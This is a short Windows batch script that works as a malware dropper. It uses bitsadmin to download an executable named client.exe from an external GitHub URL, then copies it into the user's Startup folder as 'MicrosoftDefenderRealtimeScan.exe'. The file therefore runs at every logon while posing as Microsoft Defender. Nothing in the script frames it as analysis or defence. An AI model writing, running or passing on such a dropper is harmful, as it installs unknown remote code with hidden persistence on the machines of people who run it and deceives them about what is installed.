@echo off
set "autostart_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftDefenderRealtimeScan.exe"
bitsadmin.exe /transfer "clientdownload" https://github.com/simon0302010/temp/raw/main/client.exe client.exe
copy "client.exe" "%autostart_folder%"
